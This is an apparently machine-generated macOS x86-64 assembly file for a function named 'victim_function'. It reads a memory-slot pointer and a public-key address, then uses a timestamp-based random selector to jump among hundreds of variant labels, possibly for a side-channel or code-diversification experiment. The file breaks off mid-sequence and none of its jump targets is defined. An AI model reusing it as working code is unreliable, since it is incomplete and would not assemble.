	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	leaq	_public_key(%rip), %rcx
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$2500, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_function_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_function_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_function_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_function_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_function_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_function_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_function_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_function_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_function_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_function_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_function_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_function_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_function_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_function_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_function_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_function_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_function_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_function_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_function_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_function_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_function_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_function_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_function_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_function_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_function_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_function_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_function_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_function_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_function_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_function_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_function_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_function_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_function_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_function_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_function_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_function_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_function_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_function_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_function_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_function_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_function_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_function_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_function_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_function_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_function_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_function_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_function_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_function_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_function_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_function_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_function_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_function_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_function_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_function_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_function_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_function_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_function_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_function_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_function_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_function_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_function_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_function_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_function_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_function_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_function_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_function_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_function_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_function_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_function_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_function_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_function_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_function_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_function_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_function_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_function_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_function_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_function_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_function_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_function_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_function_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_function_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_function_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_function_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_function_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_function_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_function_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_function_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_function_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_function_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_function_win0_var99
	cmpl	$100, %eax
	je	.Lvictim_function_win0_var100
	cmpl	$101, %eax
	je	.Lvictim_function_win0_var101
	cmpl	$102, %eax
	je	.Lvictim_function_win0_var102
	cmpl	$103, %eax
	je	.Lvictim_function_win0_var103
	cmpl	$104, %eax
	je	.Lvictim_function_win0_var104
	cmpl	$105, %eax
	je	.Lvictim_function_win0_var105
	cmpl	$106, %eax
	je	.Lvictim_function_win0_var106
	cmpl	$107, %eax
	je	.Lvictim_function_win0_var107
	cmpl	$108, %eax
	je	.Lvictim_function_win0_var108
	cmpl	$109, %eax
	je	.Lvictim_function_win0_var109
	cmpl	$110, %eax
	je	.Lvictim_function_win0_var110
	cmpl	$111, %eax
	je	.Lvictim_function_win0_var111
	cmpl	$112, %eax
	je	.Lvictim_function_win0_var112
	cmpl	$113, %eax
	je	.Lvictim_function_win0_var113
	cmpl	$114, %eax
	je	.Lvictim_function_win0_var114
	cmpl	$115, %eax
	je	.Lvictim_function_win0_var115
	cmpl	$116, %eax
	je	.Lvictim_function_win0_var116
	cmpl	$117, %eax
	je	.Lvictim_function_win0_var117
	cmpl	$118, %eax
	je	.Lvictim_function_win0_var118
	cmpl	$119, %eax
	je	.Lvictim_function_win0_var119
	cmpl	$120, %eax
	je	.Lvictim_function_win0_var120
	cmpl	$121, %eax
	je	.Lvictim_function_win0_var121
	cmpl	$122, %eax
	je	.Lvictim_function_win0_var122
	cmpl	$123, %eax
	je	.Lvictim_function_win0_var123
	cmpl	$124, %eax
	je	.Lvictim_function_win0_var124
	cmpl	$125, %eax
	je	.Lvictim_function_win0_var125
	cmpl	$126, %eax
	je	.Lvictim_function_win0_var126
	cmpl	$127, %eax
	je	.Lvictim_function_win0_var127
	cmpl	$128, %eax
	je	.Lvictim_function_win0_var128
	cmpl	$129, %eax
	je	.Lvictim_function_win0_var129
	cmpl	$130, %eax
	je	.Lvictim_function_win0_var130
	cmpl	$131, %eax
	je	.Lvictim_function_win0_var131
	cmpl	$132, %eax
	je	.Lvictim_function_win0_var132
	cmpl	$133, %eax
	je	.Lvictim_function_win0_var133
	cmpl	$134, %eax
	je	.Lvictim_function_win0_var134
	cmpl	$135, %eax
	je	.Lvictim_function_win0_var135
	cmpl	$136, %eax
	je	.Lvictim_function_win0_var136
	cmpl	$137, %eax
	je	.Lvictim_function_win0_var137
	cmpl	$138, %eax
	je	.Lvictim_function_win0_var138
	cmpl	$139, %eax
	je	.Lvictim_function_win0_var139
	cmpl	$140, %eax
	je	.Lvictim_function_win0_var140
	cmpl	$141, %eax
	je	.Lvictim_function_win0_var141
	cmpl	$142, %eax
	je	.Lvictim_function_win0_var142
	cmpl	$143, %eax
	je	.Lvictim_function_win0_var143
	cmpl	$144, %eax
	je	.Lvictim_function_win0_var144
	cmpl	$145, %eax
	je	.Lvictim_function_win0_var145
	cmpl	$146, %eax
	je	.Lvictim_function_win0_var146
	cmpl	$147, %eax
	je	.Lvictim_function_win0_var147
	cmpl	$148, %eax
	je	.Lvictim_function_win0_var148
	cmpl	$149, %eax
	je	.Lvictim_function_win0_var149
	cmpl	$150, %eax
	je	.Lvictim_function_win0_var150
	cmpl	$151, %eax
	je	.Lvictim_function_win0_var151
	cmpl	$152, %eax
	je	.Lvictim_function_win0_var152
	cmpl	$153, %eax
	je	.Lvictim_function_win0_var153
	cmpl	$154, %eax
	je	.Lvictim_function_win0_var154
	cmpl	$155, %eax
	je	.Lvictim_function_win0_var155
	cmpl	$156, %eax
	je	.Lvictim_function_win0_var156
	cmpl	$157, %eax
	je	.Lvictim_function_win0_var157
	cmpl	$158, %eax
	je	.Lvictim_function_win0_var158
	cmpl	$159, %eax
	je	.Lvictim_function_win0_var159
	cmpl	$160, %eax
	je	.Lvictim_function_win0_var160
	cmpl	$161, %eax
	je	.Lvictim_function_win0_var161
	cmpl	$162, %eax
	je	.Lvictim_function_win0_var162
	cmpl	$163, %eax
	je	.Lvictim_function_win0_var163
	cmpl	$164, %eax
	je	.Lvictim_function_win0_var164
	cmpl	$165, %eax
	je	.Lvictim_function_win0_var165
	cmpl	$166, %eax
	je	.Lvictim_function_win0_var166
	cmpl	$167, %eax
	je	.Lvictim_function_win0_var167
	cmpl	$168, %eax
	je	.Lvictim_function_win0_var168
	cmpl	$169, %eax
	je	.Lvictim_function_win0_var169
	cmpl	$170, %eax
	je	.Lvictim_function_win0_var170
	cmpl	$171, %eax
	je	.Lvictim_function_win0_var171
	cmpl	$172, %eax
	je	.Lvictim_function_win0_var172
	cmpl	$173, %eax
	je	.Lvictim_function_win0_var173
	cmpl	$174, %eax
	je	.Lvictim_function_win0_var174
	cmpl	$175, %eax
	je	.Lvictim_function_win0_var175
	cmpl	$176, %eax
	je	.Lvictim_function_win0_var176
	cmpl	$177, %eax
	je	.Lvictim_function_win0_var177
	cmpl	$178, %eax
	je	.Lvictim_function_win0_var178
	cmpl	$179, %eax
	je	.Lvictim_function_win0_var179
	cmpl	$180, %eax
	je	.Lvictim_function_win0_var180
	cmpl	$181, %eax
	je	.Lvictim_function_win0_var181
	cmpl	$182, %eax
	je	.Lvictim_function_win0_var182
	cmpl	$183, %eax
	je	.Lvictim_function_win0_var183
	cmpl	$184, %eax
	je	.Lvictim_function_win0_var184
	cmpl	$185, %eax
	je	.Lvictim_function_win0_var185
	cmpl	$186, %eax
	je	.Lvictim_function_win0_var186
	cmpl	$187, %eax
	je	.Lvictim_function_win0_var187
	cmpl	$188, %eax
	je	.Lvictim_function_win0_var188
	cmpl	$189, %eax
	je	.Lvictim_function_win0_var189
	cmpl	$190, %eax
	je	.Lvictim_function_win0_var190
	cmpl	$191, %eax
	je	.Lvictim_function_win0_var191
	cmpl	$192, %eax
	je	.Lvictim_function_win0_var192
	cmpl	$193, %eax
	je	.Lvictim_function_win0_var193
	cmpl	$194, %eax
	je	.Lvictim_function_win0_var194
	cmpl	$195, %eax
	je	.Lvictim_function_win0_var195
	cmpl	$196, %eax
	je	.Lvictim_function_win0_var196
	cmpl	$197, %eax
	je	.Lvictim_function_win0_var197
	cmpl	$198, %eax
	je	.Lvictim_function_win0_var198
	cmpl	$199, %eax
	je	.Lvictim_function_win0_var199
	cmpl	$200, %eax
	je	.Lvictim_function_win0_var200
	cmpl	$201, %eax
	je	.Lvictim_function_win0_var201
	cmpl	$202, %eax
	je	.Lvictim_function_win0_var202
	cmpl	$203, %eax
	je	.Lvictim_function_win0_var203
	cmpl	$204, %eax
	je	.Lvictim_function_win0_var204
	cmpl	$205, %eax
	je	.Lvictim_function_win0_var205
	cmpl	$206, %eax
	je	.Lvictim_function_win0_var206
	cmpl	$207, %eax
	je	.Lvictim_function_win0_var207
	cmpl	$208, %eax
	je	.Lvictim_function_win0_var208
	cmpl	$209, %eax
	je	.Lvictim_function_win0_var209
	cmpl	$210, %eax
	je	.Lvictim_function_win0_var210
	cmpl	$211, %eax
	je	.Lvictim_function_win0_var211
	cmpl	$212, %eax
	je	.Lvictim_function_win0_var212
	cmpl	$213, %eax
	je	.Lvictim_function_win0_var213
	cmpl	$214, %eax
	je	.Lvictim_function_win0_var214
	cmpl	$215, %eax
	je	.Lvictim_function_win0_var215
	cmpl	$216, %eax
	je	.Lvictim_function_win0_var216
	cmpl	$217, %eax
	je	.Lvictim_function_win0_var217
	cmpl	$218, %eax
	je	.Lvictim_function_win0_var218
	cmpl	$219, %eax
	je	.Lvictim_function_win0_var219
	cmpl	$220, %eax
	je	.Lvictim_function_win0_var220
	cmpl	$221, %eax
	je	.Lvictim_function_win0_var221
	cmpl	$222, %eax
	je	.Lvictim_function_win0_var222
	cmpl	$223, %eax
	je	.Lvictim_function_win0_var223
	cmpl	$224, %eax
	je	.Lvictim_function_win0_var224
	cmpl	$225, %eax
	je	.Lvictim_function_win0_var225
	cmpl	$226, %eax
	je	.Lvictim_function_win0_var226
	cmpl	$227, %eax
	je	.Lvictim_function_win0_var227
	cmpl	$228, %eax
	je	.Lvictim_function_win0_var228
	cmpl	$229, %eax
	je	.Lvictim_function_win0_var229
	cmpl	$230, %eax
	je	.Lvictim_function_win0_var230
	cmpl	$231, %eax
	je	.Lvictim_function_win0_var231
	cmpl	$232, %eax
	je	.Lvictim_function_win0_var232
	cmpl	$233, %eax
	je	.Lvictim_function_win0_var233
	cmpl	$234, %eax
	je	.Lvictim_function_win0_var234
	cmpl	$235, %eax
	je	.Lvictim_function_win0_var235
	cmpl	$236, %eax
	je	.Lvictim_function_win0_var236
	cmpl	$237, %eax
	je	.Lvictim_function_win0_var237
	cmpl	$238, %eax
	je	.Lvictim_function_win0_var238
	cmpl	$239, %eax
	je	.Lvictim_function_win0_var239
	cmpl	$240, %eax
	je	.Lvictim_function_win0_var240
	cmpl	$241, %eax
	je	.Lvictim_function_win0_var241
	cmpl	$242, %eax
	je	.Lvictim_function_win0_var242
	cmpl	$243, %eax
	je	.Lvictim_function_win0_var243
	cmpl	$244, %eax
	je	.Lvictim_function_win0_var244
	cmpl	$245, %eax
	je	.Lvictim_function_win0_var245
	cmpl	$246, %eax
	je	.Lvictim_function_win0_var246
	cmpl	$247, %eax
	je	.Lvictim_function_win0_var247
	cmpl	$248, %eax
	je	.Lvictim_function_win0_var248
	cmpl	$249, %eax
	je	.Lvictim_function_win0_var249
	cmpl	$250, %eax
	je	.Lvictim_function_win0_var250
	cmpl	$251, %eax
	je	.Lvictim_function_win0_var251
	cmpl	$252, %eax
	je	.Lvictim_function_win0_var252
	cmpl	$253, %eax
	je	.Lvictim_function_win0_var253
	cmpl	$254, %eax
	je	.Lvictim_function_win0_var254
	cmpl	$255, %eax
	je	.Lvictim_function_win0_var255
	cmpl	$256, %eax
	je	.Lvictim_function_win0_var256
	cmpl	$257, %eax
	je	.Lvictim_function_win0_var257
	cmpl	$258, %eax
	je	.Lvictim_function_win0_var258
	cmpl	$259, %eax
	je	.Lvictim_function_win0_var259
	cmpl	$260, %eax
	je	.Lvictim_function_win0_var260
	cmpl	$261, %eax
	je	.Lvictim_function_win0_var261
	cmpl	$262, %eax
	je	.Lvictim_function_win0_var262
	cmpl	$263, %eax
	je	.Lvictim_function_win0_var263
	cmpl	$264, %eax
	je	.Lvictim_function_win0_var264
	cmpl	$265, %eax
	je	.Lvictim_function_win0_var265
	cmpl	$266, %eax
	je	.Lvictim_function_win0_var266
	cmpl	$267, %eax
	je	.Lvictim_function_win0_var267
	cmpl	$268, %eax
	je	.Lvictim_function_win0_var268
	cmpl	$269, %eax
	je	.Lvictim_function_win0_var269
	cmpl	$270, %eax
	je	.Lvictim_function_win0_var270
	cmpl	$271, %eax
	je	.Lvictim_function_win0_var271
	cmpl	$272, %eax
	je	.Lvictim_function_win0_var272
	cmpl	$273, %eax
	je	.Lvictim_function_win0_var273
	cmpl	$274, %eax
	je	.Lvictim_function_win0_var274
	cmpl	$275, %eax
	je	.Lvictim_function_win0_var275
	cmpl	$276, %eax
	je	.Lvictim_function_win0_var276
	cmpl	$277, %eax
	je	.Lvictim_function_win0_var277
	cmpl	$278, %eax
	je	.Lvictim_function_win0_var278
	cmpl	$279, %eax
	je	.Lvictim_function_win0_var279
	cmpl	$280, %eax
	je	.Lvictim_function_win0_var280
	cmpl	$281, %eax
	je	.Lvictim_function_win0_var281
	cmpl	$282, %eax
	je	.Lvictim_function_win0_var282
	cmpl	$283, %eax
	je	.Lvictim_function_win0_var283
	cmpl	$284, %eax
	je	.Lvictim_function_win0_var284
	cmpl	$285, %eax
	je	.Lvictim_function_win0_var285
	cmpl	$286, %eax
	je	.Lvictim_function_win0_var286
	cmpl	$287, %eax
	je	.Lvictim_function_win0_var287
	cmpl	$288, %eax
	je	.Lvictim_function_win0_var288
	cmpl	$289, %eax
	je	.Lvictim_function_win0_var289
	cmpl	$290, %eax
	je	.Lvictim_function_win0_var290
	cmpl	$291, %eax
	je	.Lvictim_function_win0_var291
	cmpl	$292, %eax
	je	.Lvictim_function_win0_var292
	cmpl	$293, %eax
	je	.Lvictim_function_win0_var293
	cmpl	$294, %eax
	je	.Lvictim_function_win0_var294
	cmpl	$295, %eax
	je	.Lvictim_function_win0_var295
	cmpl	$296, %eax
	je	.Lvictim_function_win0_var296
	cmpl	$297, %eax
	je	.Lvictim_function_win0_var297
	cmpl	$298, %eax
	je	.Lvictim_function_win0_var298
	cmpl	$299, %eax
	je	.Lvictim_function_win0_var299
	cmpl	$300, %eax
	je	.Lvictim_function_win0_var300
	cmpl	$301, %eax
	je	.Lvictim_function_win0_var301
	cmpl	$302, %eax
	je	.Lvictim_function_win0_var302
	cmpl	$303, %eax
	je	.Lvictim_function_win0_var303
	cmpl	$304, %eax
	je	.Lvictim_function_win0_var304
	cmpl	$305, %eax
	je	.Lvictim_function_win0_var305
	cmpl	$306, %eax
	je	.Lvictim_function_win0_var306
	cmpl	$307, %eax
	je	.Lvictim_function_win0_var307
	cmpl	$308, %eax
	je	.Lvictim_function_win0_var308
	cmpl	$309, %eax
	je	.Lvictim_function_win0_var309
	cmpl	$310, %eax
	je	.Lvictim_function_win0_var310
	cmpl	$311, %eax
	je	.Lvictim_function_win0_var311
	cmpl	$312, %eax
	je	.Lvictim_function_win0_var312
	cmpl	$313, %eax
	je	.Lvictim_function_win0_var313
	cmpl	$314, %eax
	je	.Lvictim_function_win0_var314
	cmpl	$315, %eax
	je	.Lvictim_function_win0_var315
	cmpl	$316, %eax
	je	.Lvictim_function_win0_var316
	cmpl	$317, %eax
	je	.Lvictim_function_win0_var317
	cmpl	$318, %eax
	je	.Lvictim_function_win0_var318
	cmpl	$319, %eax
	je	.Lvictim_function_win0_var319
	cmpl	$320, %eax
	je	.Lvictim_function_win0_var320
	cmpl	$321, %eax
	je	.Lvictim_function_win0_var321
	cmpl	$322, %eax
	je	.Lvictim_function_win0_var322
	cmpl	$323, %eax
	je	.Lvictim_function_win0_var323
	cmpl	$324, %eax
	je	.Lvictim_function_win0_var324
	cmpl	$325, %eax
	je	.Lvictim_function_win0_var325
	cmpl	$326, %eax
	je	.Lvictim_function_win0_var326
	cmpl	$327, %eax
	je	.Lvictim_function_win0_var327
	cmpl	$328, %eax
	je	.Lvictim_function_win0_var328
	cmpl	$329, %eax
	je	.Lvictim_function_win0_var329
	cmpl	$330, %eax
	je	.Lvictim_function_win0_var330
	cmpl	$331, %eax
	je	.Lvictim_function_win0_var331
	cmpl	$332, %eax
	je	.Lvictim_function_win0_var332
	cmpl	$333, %eax
	je	.Lvictim_function_win0_var333
	cmpl	$334, %eax
	je	.Lvictim_function_win0_var334
	cmpl	$335, %eax
	je	.Lvictim_function_win0_var335
	cmpl	$336, %eax
	je	.Lvictim_function_win0_var336
	cmpl	$337, %eax
	je	.Lvictim_function_win0_var337
	cmpl	$338, %eax
	je	.Lvictim_function_win0_var338
	cmpl	$339, %eax
	je	.Lvictim_function_win0_var339
	cmpl	$340, %eax
	je	.Lvictim_function_win0_var340
	cmpl	$341, %eax
	je	.Lvictim_function_win0_var341
	cmpl	$342, %eax
	je	.Lvictim_function_win0_var342
	cmpl	$343, %eax
	je	.Lvictim_function_win0_var343
	cmpl	$344, %eax
	je	.Lvictim_function_win0_var344
	cmpl	$345, %eax
	je	.Lvictim_function_win0_var345
	cmpl	$346, %eax
	je	.Lvictim_function_win0_var346
	cmpl	$347, %eax
	je	.Lvictim_function_win0_var347
	cmpl	$348, %eax
	je	.Lvictim_function_win0_var348
	cmpl	$349, %eax
	je	.Lvictim_function_win0_var349
	cmpl	$350, %eax
	je	.Lvictim_function_win0_var350
	cmpl	$351, %eax
	je	.Lvictim_function_win0_var351
	cmpl	$352, %eax
	je	.Lvictim_function_win0_var352
	cmpl	$353, %eax
	je	.Lvictim_function_win0_var353
	cmpl	$354, %eax
	je	.Lvictim_function_win0_var354
	cmpl	$355, %eax
	je	.Lvictim_function_win0_var355
	cmpl	$356, %eax
	je	.Lvictim_function_win0_var356
	cmpl	$357, %eax
	je	.Lvictim_function_win0_var357
	cmpl	$358, %eax
	je	.Lvictim_function_win0_var358
	cmpl	$359, %eax
	je	.Lvictim_function_win0_var359
	cmpl	$360, %eax
	je	.Lvictim_function_win0_var360
	cmpl	$361, %eax
	je	.Lvictim_function_win0_var361
	cmpl	$362, %eax
	je	.Lvictim_function_win0_var362
	cmpl	$363, %eax
	je	.Lvictim_function_win0_var363
	cmpl	$364, %eax
	je	.Lvictim_function_win0_var364
	cmpl	$365, %eax
	je	.Lvictim_function_win0_var365
	cmpl	$366, %eax
	je	.Lvictim_function_win0_var366
	cmpl	$367, %eax
	je	.Lvictim_function_win0_var367
	cmpl	$368, %eax
	je	.Lvictim_function_win0_var368
	cmpl	$369, %eax
	je	.Lvictim_function_win0_var369
	cmpl	$370, %eax
	je	.Lvictim_function_win0_var370
	cmpl	$371, %eax
	je	.Lvictim_function_win0_var371
	cmpl	$372, %eax
	je	.Lvictim_function_win0_var372
	cmpl	$373, %eax
	je	.Lvictim_function_win0_var373
	cmpl	$374, %eax
	je	.Lvictim_function_win0_var374
	cmpl	$375, %eax
	je	.Lvictim_function_win0_var375
	cmpl	$376, %eax
	je	.Lvictim_function_win0_var376
	cmpl	$377, %eax
	je	.Lvictim_function_win0_var377
	cmpl	$378, %eax
	je	.Lvictim_function_win0_var378
	cmpl	$379, %eax
	je	.Lvictim_function_win0_var379
	cmpl	$380, %eax
	je	.Lvictim_function_win0_var380
	cmpl	$381, %eax
	je	.Lvictim_function_win0_var381
	cmpl	$382, %eax
	je	.Lvictim_function_win0_var382
	cmpl	$383, %eax
	je	.Lvictim_function_win0_var383
	cmpl	$384, %eax
	je	.Lvictim_function_win0_var384
	cmpl	$385, %eax
	je	.Lvictim_function_win0_var385
	cmpl	$386, %eax
	je	.Lvictim_function_win0_var386
	cmpl	$387, %eax
	je	.Lvictim_function_win0_var387
	cmpl	$388, %eax
	je	.Lvictim_function_win0_var388
	cmpl	$389, %eax
	je	.Lvictim_function_win0_var389
	cmpl	$390, %eax
	je	.Lvictim_function_win0_var390
	cmpl	$391, %eax
	je	.Lvictim_function_win0_var391
	cmpl	$392, %eax
	je	.Lvictim_function_win0_var392
	cmpl	$393, %eax
	je	.Lvictim_function_win0_var393
	cmpl	$394, %eax
	je	.Lvictim_function_win0_var394
	cmpl	$395, %eax
	je	.Lvictim_function_win0_var395
	cmpl	$396, %eax
	je	.Lvictim_function_win0_var396
	cmpl	$397, %eax
	je	.Lvictim_function_win0_var397
	cmpl	$398, %eax
	je	.Lvictim_function_win0_var398
	cmpl	$399, %eax
	je	.Lvictim_function_win0_var399
	cmpl	$400, %eax
	je	.Lvictim_function_win0_var400
	cmpl	$401, %eax
	je	.Lvictim_function_win0_var401
	cmpl	$402, %eax
	je	.Lvictim_function_win0_var402
	cmpl	$403, %eax
	je	.Lvictim_function_win0_var403
	cmpl	$404, %eax
	je	.Lvictim_function_win0_var404
	cmpl	$405, %eax
	je	.Lvictim_function_win0_var405
	cmpl	$406, %eax
	je	.Lvictim_function_win0_var406
	cmpl	$407, %eax
	je	.Lvictim_function_win0_var407
	cmpl	$408, %eax
	je	.Lvictim_function_win0_var408
	cmpl	$409, %eax
	je	.Lvictim_function_win0_var409
	cmpl	$410, %eax
	je	.Lvictim_function_win0_var410
	cmpl	$411, %eax
	je	.Lvictim_function_win0_var411
	cmpl	$412, %eax
	je	.Lvictim_function_win0_var412
	cmpl	$413, %eax
	je	.Lvictim_function_win0_var413
	cmpl	$414, %eax
	je	.Lvictim_function_win0_var414
	cmpl	$415, %eax
	je	.Lvictim_function_win0_var415
	cmpl	$416, %eax
	je	.Lvictim_function_win0_var416
	cmpl	$417, %eax
	je	.Lvictim_function_win0_var417
	cmpl	$418, %eax
	je	.Lvictim_function_win0_var418
	cmpl	$419, %eax
	je	.Lvictim_function_win0_var419
	cmpl	$420, %eax
	je	.Lvictim_function_win0_var420
	cmpl	$421, %eax
	je	.Lvictim_function_win0_var421
	cmpl	$422, %eax
	je	.Lvictim_function_win0_var422
	cmpl	$423, %eax
	je	.Lvictim_function_win0_var423
	cmpl	$424, %eax
	je	.Lvictim_function_win0_var424
	cmpl	$425, %eax
	je	.Lvictim_function_win0_var425
	cmpl	$426, %eax
	je	.Lvictim_function_win0_var426
	cmpl	$427, %eax
	je	.Lvictim_function_win0_var427
	cmpl	$428, %eax
	je	.Lvictim_function_win0_var428
	cmpl	$429, %eax
	je	.Lvictim_function_win0_var429
	cmpl	$430, %eax
	je	.Lvictim_function_win0_var430
	cmpl	$431, %eax
	je	.Lvictim_function_win0_var431
	cmpl	$432, %eax
	je	.Lvictim_function_win0_var432
	cmpl	$433, %eax
	je	.Lvictim_function_win0_var433
	cmpl	$434, %eax
	je	.Lvictim_function_win0_var434
	cmpl	$435, %eax
	je	.Lvictim_function_win0_var435
	cmpl	$436, %eax
	je	.Lvictim_function_win0_var436
	cmpl	$437, %eax
	je	.Lvictim_function_win0_var437
	cmpl	$438, %eax
	je	.Lvictim_function_win0_var438
	cmpl	$439, %eax
	je	.Lvictim_function_win0_var439
	cmpl	$440, %eax
	je	.Lvictim_function_win0_var440
	cmpl	$441, %eax
	je	.Lvictim_function_win0_var441
	cmpl	$442, %eax
	je	.Lvictim_function_win0_var442
	cmpl	$443, %eax
	je	.Lvictim_function_win0_var443
	cmpl	$444, %eax
	je	.Lvictim_function_win0_var444
	cmpl	$445, %eax
	je	.Lvictim_function_win0_var445
	cmpl	$446, %eax
	je	.Lvictim_function_win0_var446
	cmpl	$447, %eax
	je	.Lvictim_function_win0_var447
	cmpl	$448, %eax
	je	.Lvictim_function_win0_var448
	cmpl	$449, %eax
	je	.Lvictim_function_win0_var449
	cmpl	$450, %eax
	je	.Lvictim_function_win0_var450
	cmpl	$451, %eax
	je	.Lvictim_function_win0_var451
	cmpl	$452, %eax
	je	.Lvictim_function_win0_var452
	cmpl	$453, %eax
	je	.Lvictim_function_win0_var453
	cmpl	$454, %eax
	je	.Lvictim_function_win0_var454
	cmpl	$455, %eax
	je	.Lvictim_function_win0_var455
	cmpl	$456, %eax
	je	.Lvictim_function_win0_var456
	cmpl	$457, %eax
	je	.Lvictim_function_win0_var457
	cmpl	$458, %eax
	je	.Lvictim_function_win0_var458
	cmpl	$459, %eax
	je	.Lvictim_function_win0_var459
	cmpl	$460, %eax
	je	.Lvictim_function_win0_var460
	cmpl	$461, %eax
	je	.Lvictim_function_win0_var461
	cmpl	$462, %eax
	je	.Lvictim_function_win0_var462
	cmpl	$463, %eax
	je	.Lvictim_function_win0_var463
	cmpl	$464, %eax
	je	.Lvictim_function_win0_var464
	cmpl	$465, %eax
	je	.Lvictim_function_win0_var465
	cmpl	$466, %eax
	je	.Lvictim_function_win0_var466
	cmpl	$467, %eax
	je	.Lvictim_function_win0_var467
	cmpl	$468, %eax
	je	.Lvictim_function_win0_var468
	cmpl	$469, %eax
